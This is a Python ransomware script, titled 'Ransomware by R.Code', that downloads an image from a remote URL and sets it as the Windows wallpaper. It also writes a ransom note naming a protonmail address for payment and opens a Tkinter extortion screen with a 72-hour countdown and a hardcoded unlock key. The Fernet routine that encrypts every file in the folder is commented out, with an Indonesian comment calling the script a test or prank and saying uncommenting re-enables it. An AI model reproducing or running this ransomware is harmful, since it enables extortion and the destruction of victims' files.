import tkinter as tk
import tkinter.font
from tkinter import *
from tkinter import messagebox
import time
from cryptography.fernet import Fernet
import os
import ctypes
import urllib.request
import requests


def change_wallpaper():
    imageUrl = 'https://cdn.discordapp.com/attachments/1015813895740469249/1073782195279376494/20230211_084541_0000.png'
    r = requests.get(imageUrl)
    name = "IRansom_wallpaper.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)


change_wallpaper()


def ransom_note():
    with open("IRansom_Note.txt", "w") as f:
        f.write(f'''
        
                     ...::...                     
            ..   .:::^^^^^^^^:::.   ..            
          !PJ  .::.::....: ..^:.:^.  J5~          
       !!Y&Y  :^:.:. .: .: .. ^^::::  Y&Y!~       
      7B?BJ..^. .^:::^:7JYY:^:.^^  .^ :JGJG!      
     ~BJ75J.^   :.  :: 7!YB...  ^:  .^.J57JG^     
    JYBPP?.^..::^   ^.  .7.  :  .^.:..:.?PPGJ?    
    BYG5J^:.   ^::::~:::77.::^:::^^   ::^J5GJG    
   .B5?PP.^    ^   .^ ..??.. :.  .^    ^.5P7YB    
   7GGB5..:   .:   .^   ..   :.   ^.   :..PBGP7   
  .P7&J?:::...:^.. :^.^:J5^^::....^:...:::?J&7G.  
   B?JJB ::...:^.:~7YB? 7J 7#Y~::.^:...:: GJJJB.  
   ?#~#J .:   .:~##&&&^ ~7 ^&&#BBY^.   :. J#~#J   
   ~BBB!^ :    :5&&&&&! ?P !&&&&&&!    ^ ^7BBG~   
   Y!G5?5 :.  .~#&&&&&5 YB 5&&&&&&7   .: 5?PG!5   
   7#?7PG  ^...~&&&&&&&!YB7&&&&&&&?...:  G57?#7   
    Y&JPB!^.^  J&&&&&&&#B##&&&&&&&5  ^ ^7B5J&J    
    :5B#&!P..:.P&&&&&&&&&&&&&&&&&&G.: :G!&#BY.    
     ?5JG7P5  :B&&&&&&&&&&&&&&&&&&B:  5P7GJ5?     
     .5#PJ?#77^#&&&&&&&&&&&&&&&&&&#~77#7JPBY.     
       ~PGGB#JG#&&&&&&&&&&&&&&&&&&&BJ#BGGP~       
        !YYJYJ!G&&&&&&&&&&&&&&&&&&G7JYJYY!        
         ^YGGGGPP5#&&&&&&&&&&&&G5PPGGGGY~         
           :7?77JP#&&&&&&&&&&&&#5J77?7:           
            .75GGB&&&&&&&&&&&&&BPGG57.            
                 ?&&&&&&&&&&&&&5                  
                 7#&&&&&&&&&&&&P                  
                  :~7JY5PP5YJ7~:            
                        
=================================================================
Hello if you see this message, it means that your device is not doing well.
All your important files are encrypted. 
There is no other way but to recover your files with a special key, 
Only we can decrypt your files! To pay and recover your files, 
==================================================================
please follow these steps:

1. Contact hcrcode@protonmail.com email to pay and decrypt your files.
2.If you have already paid, send proof of payment to the email.
3. You will be given a text file containing the key to recover your file

Good luck!
Regards :
R.Code
        
        ''')


ransom_note()

# =======================================================================================================================
# CODE YANG DI BAWAH UNTUK ENKRIPSI FILE JADI SAYA MATIKAN BIAR AMAN, KLW MAU IDUPIN LAGI,
# TINGGAL DI UNCOMMENT AJA, TPI SEGALA RESIKO NYA SAYA GAK TANGGUNG JAWAB, KARNA INI TUJUAN NYA BUAT UJI COBA + NGEPRANK AJA
# =========================================================================================================================

# files = []

# for file in os.listdir():
#     if file == "main.py" or file == "encrypt.key":
#         continue
#     if os.path.isfile(file):
#         files.append(file)

# print(files)

# key = Fernet.generate_key()

# with open('encrypt.key', 'wb') as thekey:
#     thekey.write(key)

# for file in files:
#     with open(file, "rb") as thefile:
#         contents = thefile.read()
#     encrypted_content = Fernet(key).encrypt(contents)
#     with open(file, 'wb') as thefile:
#         thefile.write(encrypted_content)


app = tk.Tk()
app.title("Ransomware by R.Code")
app.geometry("1400x700")

main_frame = tk.Frame(master=app, width=350, height=500, bg="black")
main_frame.pack(fill=tk.BOTH, expand=True)

main_font = tk.font.Font(family="Lucida Sans Typewriter",
                         size=8,
                         weight="bold")

text = """

                     ...::...                     
            ..   .:::^^^^^^^^:::.   ..            
          !PJ  .::.::....: ..^:.:^.  J5~          
       !!Y&Y  :^:.:. .: .: .. ^^::::  Y&Y!~       
      7B?BJ..^. .^:::^:7JYY:^:.^^  .^ :JGJG!      
     ~BJ75J.^   :.  :: 7!YB...  ^:  .^.J57JG^     
    JYBPP?.^..::^   ^.  .7.  :  .^.:..:.?PPGJ?    
    BYG5J^:.   ^::::~:::77.::^:::^^   ::^J5GJG    
   .B5?PP.^    ^   .^ ..??.. :.  .^    ^.5P7YB    
   7GGB5..:   .:   .^   ..   :.   ^.   :..PBGP7   
  .P7&J?:::...:^.. :^.^:J5^^::....^:...:::?J&7G.  
   B?JJB ::...:^.:~7YB? 7J 7#Y~::.^:...:: GJJJB.  
   ?#~#J .:   .:~##&&&^ ~7 ^&&#BBY^.   :. J#~#J   
   ~BBB!^ :    :5&&&&&! ?P !&&&&&&!    ^ ^7BBG~   
   Y!G5?5 :.  .~#&&&&&5 YB 5&&&&&&7   .: 5?PG!5   
   7#?7PG  ^...~&&&&&&&!YB7&&&&&&&?...:  G57?#7   
    Y&JPB!^.^  J&&&&&&&#B##&&&&&&&5  ^ ^7B5J&J    
    :5B#&!P..:.P&&&&&&&&&&&&&&&&&&G.: :G!&#BY.    
     ?5JG7P5  :B&&&&&&&&&&&&&&&&&&B:  5P7GJ5?     
     .5#PJ?#77^#&&&&&&&&&&&&&&&&&&#~77#7JPBY.     
       ~PGGB#JG#&&&&&&&&&&&&&&&&&&&BJ#BGGP~       
        !YYJYJ!G&&&&&&&&&&&&&&&&&&G7JYJYY!        
         ^YGGGGPP5#&&&&&&&&&&&&G5PPGGGGY~         
           :7?77JP#&&&&&&&&&&&&#5J77?7:           
            .75GGB&&&&&&&&&&&&&BPGG57.            
                 ?&&&&&&&&&&&&&5                  
                 7#&&&&&&&&&&&&P                  
                  :~7JY5PP5YJ7~:                  
"""

banner_text = tk.Label(
    main_frame, text=text + "\nYOUR FILES HAS BEEN ENCRYPTED!", fg="#32CD32", bg="black", font=main_font)
banner_text.pack()

main_text = tk.Label(
    main_frame, text="To unlock the file you are obliged to pay a fine of $10\n\nYou have 72 hours to pay the fine, otherwise all your files will be permanently deleted\n\nYou must pay the fine throught hcrcode@protonmail.com", fg="white", bg="black", font=main_font)
main_text.pack(pady=20, padx=40)

time_label = tk.Label(main_frame, text="",
                      fg="red", bg="black", font=("Lucida Sans Typewriter", 20, "bold"))
time_label.pack()


remaining_time = 259200


def update_time():
    global remaining_time
    if remaining_time > 0:
        remaining_time -= 1
        minutes, seconds = divmod(remaining_time, 60)
        hours, minutes = divmod(minutes, 60)
        time_label.config(text="{:02d}:{:02d}:{:02d}".format(
            hours, minutes, seconds))
        app.after(1000, update_time)
    else:
        time_label.config(text="Time's up!")


update_time()


tk.Label(main_frame, text="Input the key to decrypt your files",
         fg="#32CD32", bg="black", font=main_font).pack()


key_input = tk.Entry(main_frame, width=50, fg="black",
                     bg="white")
key_input.pack(pady=10, ipady=3)


def check_key():

    if key_input.get() == "ISCIRansomware":
        messagebox.showinfo(
            "Success", "Your key is valid\nplase wait for your file decryption process")

        # CODE UNTUK DECRYPT FILE YANG SUDAH DI ENCRYPT

        # files = []

        # for file in os.listdir():
        #     if file == 'main.py' or file == 'encrypt.key':
        #         continue
        #     if os.path.isfile(file):
        #         files.append(file)

        # with open("encrypt.key", "rb") as key:
        #     decryptkey = key.read()

        # for file in files:
        #     with open(file, "rb") as thefile:
        #         contents = thefile.read()
        #     decrypted_content = Fernet(decryptkey).decrypt(contents)

        #     with open(file, 'wb') as thefile:
        #         thefile.write(decrypted_content)
        app.destroy()

    else:
        messagebox.showerror("Error!", "Your key is wrong!, please try again.")


tk.Button(
    main_frame, text="Decrypt your files!", fg="#32CD32", bg="black", command=check_key).pack(pady=15, padx=10, ipadx=50, ipady=10)


app.mainloop()
